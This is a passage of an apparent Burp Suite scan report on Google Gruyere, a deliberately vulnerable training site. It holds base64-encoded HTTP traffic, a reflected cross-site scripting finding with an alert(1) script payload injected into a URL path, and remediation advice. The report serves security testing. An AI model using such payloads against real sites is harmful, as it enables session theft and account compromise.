      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc2F2ZXByb2ZpbGU/dWlkPTU1NS01NTUtMDE5OUBleGFtcGxlLmNvbWE2eW44dWFtNXgmaXNfYXV0aG9yPVRydWUmcHc9JmFjdGlvbj1uZXcgSFRUUC8xLjENCkhvc3Q6IGdvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0OyBUcmlkZW50LzUuMCkNCkNvbm5lY3Rpb246IGNsb3NlDQpSZWZlcmVyOiBodHRwOi8vZ29vZ2xlLWdydXllcmUuYXBwc3BvdC5jb20vNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld2FjY291bnQuZ3RsDQpDb29raWU6IEdSVVlFUkVfSUQ9NDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2DQoNCg==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClNldC1Db29raWU6IEdSVVlFUkU9OTY2MDMyNTJ8NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tYTZ5bjh1YW01eHx8YXV0aG9yOyBwYXRoPS80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogYzE1ZjBkMDVhMDIyZjU2ZWUxYzNkZjk5ZDQ4YTAwMzcNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MTo0NiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjYyMw0KRXhwaXJlczogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MTo0NiBHTVQNCkNvbm5lY3Rpb246IGNsb3NlDQoNCjwhRE9DVFlQRSBIVE1MIFBVQkxJQyAiLS8vVzNDLy9EVEQgSFRNTCA0LjAxIFRyYW5zaXRpb25hbC8vRU4iPgo8IS0tIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuIC0tPgo8aHRtbD4KPGhlYWQ+Cjx0aXRsZT5HcnV5ZXJlOiBFcnJvcjwvdGl0bGU+CjxzdHlsZT4KLyogQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gKi8KCmJvZHksIGh0bWwsIHRkLCBzcGFuLCBkaXYsIGlucHV0LCB0ZXh0YXJlYSB7CiAgZm9udC1mYW1pbHk6IHNhbnMtc2VyaWY7CiAgZm9udC1zaXplOiAxNHB0Owp9Cgpib2R5IHsKICBiYWNrZ3JvdW5kOiB1cmwoJ2NoZWVzZS5wbmcnKSB0b3AgY2VudGVyIHJlcGVhdDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgb3BhY2l0eTogMC44MDsKfQoKaDIgewogIHRleHQtYWxpZ246IGNlbnRlcjsKICBmb250LXNpemU6IDMwcHQ7CiAgZm9udC13ZWlnaHQ6IGJvbGQ7Cn0KCnRkIHsKICB2ZXJ0aWNhbC1hbGlnbjogdG9wOwogIHBhZGRpbmc6IDVweDsKfQoKYSwgYTpob3ZlciB7CiAgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCmE6dmlzaXRlZCB7CiAgY29sb3I6ICNiYjAwMDA7Cn0KCmEuYnV0dG9uOnZpc2l0ZWQgewogIGNvbG9yOiAjMDAwMGJiOwp9CgouY29udGVudCB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBtYXJnaW4tbGVmdDogYXV0bzsKICBtYXJnaW4tcmlnaHQ6IGF1dG87CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIHBhZGRpbmc6IDIwcHg7CiAgYm9yZGVyOiAzcHggc29saWQgI2ZmYjE0OTsKfQoKLm1lbnUgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgcGFkZGluZzogMTBweCAyMHB4IDM1cHggMjBweDsKICBtYXJnaW4tbGVmdDogYXV0bzsKICBtYXJnaW4tcmlnaHQ6IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgYm9yZGVyOiAzcHggc29saWQgI2ZmYjE0OTsKfQoKLm1lbnUtdXNlciB7CiAgY29sb3I6ICMwMDAwMDA7CiAgZm9udC13ZWlnaHQ6IGJvbGQ7Cn0KCiNtZW51LWxlZnQgewogIGZsb2F0OiBsZWZ0Owp9CgojbWVudS1sZWZ0IGEsICNtZW51LWxlZnQgYTpob3ZlciwgI21lbnUtbGVmdCBhOnZpc2l0ZWQgewogIGNvbG9yOiAjMDAwMDAwOwp9CgojbWVudS1yaWdodCB7CiAgZmxvYXQ6IHJpZ2h0Owp9CgojbWVudS1yaWdodCBhLCAjbWVudS1yaWdodCBhOmhvdmVyLCAjbWVudS1yaWdodCBhOnZpc2l0ZWQgewogIGNvbG9yOiAjMDAwMDAwOwp9CgoubWVzc2FnZSB7CiAgd2lkdGg6IDUwJTsKICBjb2xvcjogI2ZmMDAwMDsKICBiYWNrZ3JvdW5kOiAjZmZkZGRkOwogIGJvcmRlcjogMnB4IHNvbGlkICNmZjAwMDA7CiAgYm9yZGVyLXJhZGl1czogMWVtOwogIC1tb3otYm9yZGVyLXJhZGl1czogMWVtOwogIHBhZGRpbmc6IDEwcHg7CiAgZm9udC13ZWlnaHQ6IGJvbGQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG1hcmdpbjogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIG1hcmdpbi1ib3R0b206IDIwcHg7Cn0KCmlucHV0LCB0ZXh0YXJlYSB7CiAgYmFja2dyb3VuZC1jb2xvcjogI2ZmZmZmZjsKfQoKLnJlZnJlc2ggewogIGZsb2F0OiBjZW50ZXI7CiAgd2lkdGg6IDkwJTsKICB0ZXh0LWFsaWduOiByaWdodDsKICBtYXJnaW46IGF1dG87CiAgcGFkZGluZy10b3A6IDA7CiAgcGFkZGluZy1ib3R0b206IDJwdDsKICBtYXJnaW4tdG9wOiAwOwogIG1hcmdpbi1ib3R0b206IDA7Cn0KCi5oMi13aXRoLXJlZnJlc2ggewogIG1hcmdpbi1ib3R0b206IDA7Cn0KCjwvc3R5bGU+Cgo8L2hlYWQ+Cgo8Ym9keT4KCjxkaXYgY2xhc3M9J21lbnUnPgogIDxzcGFuIGlkPSdtZW51LWxlZnQnPgogICAgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi8nPkhvbWU8L2E+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc25pcHBldHMuZ3RsJz5NeSZuYnNwO1NuaXBwZXRzPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbmV3c25pcHBldC5ndGwnPk5ldyZuYnNwO1NuaXBwZXQ8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi91cGxvYWQuZ3RsJz5VcGxvYWQ8L2E+CiAgICAgIAogIDwvc3Bhbj4KICA8c3BhbiBpZD0nbWVudS1yaWdodCc+CiAgICAgIAogICAgICA8c3BhbiBjbGFzcz0nbWVudS11c2VyJz4KICAgICAgICA1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20gJmx0OzU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSZndDsKICAgICAgPC9zcGFuPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2VkaXRwcm9maWxlLmd0bCc+UHJvZmlsZTwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L2xvZ291dCc+U2lnbiBvdXQ8L2E+CiAgICAgIAogICAgICAKICA8L3NwYW4+CjwvZGl2PgoKCgo8ZGl2IGNsYXNzPSdtZXNzYWdlJz5BY2NvdW50IGNyZWF0ZWQuPC9kaXY+CgoKPC9ib2R5PgoKPC9odG1sPgo=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>367921938904383488</serialNumber>
    <type>2097920</type>
    <name><![CDATA[Cross-site scripting (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/saveprofile]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/saveprofile [URL path filename]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the HTML document as plain text between tags. The payload <b>uk2qk&lt;script&gt;alert(1)&lt;/script&gt;eu3v8</b> was submitted in the URL path filename. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc2F2ZXByb2ZpbGV1azJxayUzY3NjcmlwdCUzZWFsZXJ0KDEpJTNjL3NjcmlwdCUzZWV1M3Y4IEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdhY2NvdW50Lmd0bA0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogMTI3MzZjMTFhNWIwN2ZhNGQ5YjFlYTliM2MxZjUyODUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0Mjo0MiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY3MQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2Lyc+SG9tZTwvYT4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9zbmlwcGV0cy5ndGwnPk15Jm5ic3A7U25pcHBldHM8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdzbmlwcGV0Lmd0bCc+TmV3Jm5ic3A7U25pcHBldDwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3VwbG9hZC5ndGwnPlVwbG9hZDwvYT4KICAgICAgCiAgPC9zcGFuPgogIDxzcGFuIGlkPSdtZW51LXJpZ2h0Jz4KICAgICAgCiAgICAgIDxzcGFuIGNsYXNzPSdtZW51LXVzZXInPgogICAgICAgIDU1NS01NTUtMDE5OUBleGFtcGxlLmNvbSAmbHQ7NTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tJmd0OwogICAgICA8L3NwYW4+CiAgICAgIAogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsJz5Qcm9maWxlPC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvbG9nb3V0Jz5TaWduIG91dDwvYT4KICAgICAgCiAgICAgIAogIDwvc3Bhbj4KPC9kaXY+CgoKCjxkaXYgY2xhc3M9J21lc3NhZ2UnPkludmFsaWQgcmVxdWVzdDogL3NhdmVwcm9maWxldWsycWs8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+ZXUzdjg8L2Rpdj4KCgo8L2JvZHk+Cgo8L2h0bWw+Cg==]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>43002967958934784</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/saveprofile]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/saveprofile [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvc2F2ZXByb2ZpbGVnYjVrdWlpZzJnIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KUmVmZXJlcjogaHR0cDovL2dvb2dsZS1ncnV5ZXJlLmFwcHNwb3QuY29tLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9uZXdhY2NvdW50Lmd0bA0KQ29va2llOiBHUlVZRVJFX0lEPTQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNg0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNTMxYThmYmYwYmQ1NzQxNDkxZmU1M2YyNWQzN2JkMTUNClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MjoyNiBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogMjY0Ng0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IEVycm9yPC90aXRsZT4KPHN0eWxlPgovKiBDb3B5cmlnaHQgMjAxNyBHb29nbGUgSW5jLiAqLwoKYm9keSwgaHRtbCwgdGQsIHNwYW4sIGRpdiwgaW5wdXQsIHRleHRhcmVhIHsKICBmb250LWZhbWlseTogc2Fucy1zZXJpZjsKICBmb250LXNpemU6IDE0cHQ7Cn0KCmJvZHkgewogIGJhY2tncm91bmQ6IHVybCgnY2hlZXNlLnBuZycpIHRvcCBjZW50ZXIgcmVwZWF0OwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBvcGFjaXR5OiAwLjgwOwp9CgpoMiB7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIGZvbnQtc2l6ZTogMzBwdDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKdGQgewogIHZlcnRpY2FsLWFsaWduOiB0b3A7CiAgcGFkZGluZzogNXB4Owp9CgphLCBhOmhvdmVyIHsKICB0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsKICBjb2xvcjogIzAwMDBiYjsKfQoKYTp2aXNpdGVkIHsKICBjb2xvcjogI2JiMDAwMDsKfQoKYS5idXR0b246dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwYmI7Cn0KCi5jb250ZW50IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICB3aWR0aDogOTAlOwogIGJhY2tncm91bmQ6ICNmZmZmY2M7CiAgcGFkZGluZzogMjBweDsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudSB7CiAgdGV4dC1hbGlnbjogbGVmdDsKICBwYWRkaW5nOiAxMHB4IDIwcHggMzVweCAyMHB4OwogIG1hcmdpbi1sZWZ0OiBhdXRvOwogIG1hcmdpbi1yaWdodDogYXV0bzsKICBtYXJnaW4tdG9wOiAyMHB4OwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBib3JkZXI6IDNweCBzb2xpZCAjZmZiMTQ5Owp9CgoubWVudS11c2VyIHsKICBjb2xvcjogIzAwMDAwMDsKICBmb250LXdlaWdodDogYm9sZDsKfQoKI21lbnUtbGVmdCB7CiAgZmxvYXQ6IGxlZnQ7Cn0KCiNtZW51LWxlZnQgYSwgI21lbnUtbGVmdCBhOmhvdmVyLCAjbWVudS1sZWZ0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCiNtZW51LXJpZ2h0IHsKICBmbG9hdDogcmlnaHQ7Cn0KCiNtZW51LXJpZ2h0IGEsICNtZW51LXJpZ2h0IGE6aG92ZXIsICNtZW51LXJpZ2h0IGE6dmlzaXRlZCB7CiAgY29sb3I6ICMwMDAwMDA7Cn0KCi5tZXNzYWdlIHsKICB3aWR0aDogNTAlOwogIGNvbG9yOiAjZmYwMDAwOwogIGJhY2tncm91bmQ6ICNmZmRkZGQ7CiAgYm9yZGVyOiAycHggc29saWQgI2ZmMDAwMDsKICBib3JkZXItcmFkaXVzOiAxZW07CiAgLW1vei1ib3JkZXItcmFkaXVzOiAxZW07CiAgcGFkZGluZzogMTBweDsKICBmb250LXdlaWdodDogYm9sZDsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgbWFyZ2luOiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKaW5wdXQsIHRleHRhcmVhIHsKICBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOwp9CgoucmVmcmVzaCB7CiAgZmxvYXQ6IGNlbnRlcjsKICB3aWR0aDogOTAlOwogIHRleHQtYWxpZ246IHJpZ2h0OwogIG1hcmdpbjogYXV0bzsKICBwYWRkaW5nLXRvcDogMDsKICBwYWRkaW5nLWJvdHRvbTogMnB0OwogIG1hcmdpbi10b3A6IDA7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKLmgyLXdpdGgtcmVmcmVzaCB7CiAgbWFyZ2luLWJvdHRvbTogMDsKfQoKPC9zdHlsZT4KCjwvaGVhZD4KCjxib2R5PgoKPGRpdiBjbGFzcz0nbWVudSc+CiAgPHNwYW4gaWQ9J21lbnUtbGVmdCc+CiAgICA8YSBocmVmPScvNDIxNjgzOT